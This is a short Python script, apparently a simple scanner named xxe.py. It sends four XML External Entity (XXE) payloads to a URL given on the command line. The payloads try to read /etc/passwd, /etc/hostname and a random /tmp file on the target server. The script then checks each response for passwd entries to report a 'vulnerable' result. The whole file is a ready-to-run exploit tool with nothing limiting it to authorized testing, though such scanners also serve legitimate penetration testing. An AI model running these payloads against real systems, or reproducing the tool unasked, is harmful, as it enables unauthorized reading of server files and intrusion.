import requests
import sys
import random
import string

# Function to generate random strings for payloads
def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Define XXE payloads, including an automatically generated one
XXE_PAYLOADS = [
    '''<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
    ]>
    <stockCheck><productId>&xxe;</productId></stockCheck>''',

    '''<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///etc/hostname">]>
    <foo>&xxe;</foo>''',

    # Automatically generated payload
    f'''<?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///tmp/{generate_random_string()}.txt">]>
    <foo>&xxe;</foo>'''
]

def send_payload(url, payload):
    headers = {'Content-Type': 'application/xml'}
    try:
        response = requests.post(url, data=payload, headers=headers)
        return response
    except requests.RequestException as e:
        print(f"Error sending payload: {e}")
        return None

def analyze_response(response, payload):
    if response is not None:
        if "root:x" in response.text or "daemon:x" in response.text:
            return True, response.text
        elif response.status_code == 500:
            return False, "Server error occurred"
        else:
            return False, response.text[:500]  # Limit response content for readability
    return False, "No response or request error"

def main(url):
    print(f"Testing URL: {url} for XXE vulnerabilities")

    for payload in XXE_PAYLOADS:
        print(f"\nSending payload:\n{payload}")
        response = send_payload(url, payload)
        vulnerable, content = analyze_response(response, payload)
        
        if vulnerable:
            print("Vulnerable to XXE attack!")
            print(f"Response content:\n{content}")
        else:
            print("Not vulnerable to this payload.")
            print(f"Response content:\n{content}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xxe.py <url>")
    else:
        main(sys.argv[1])
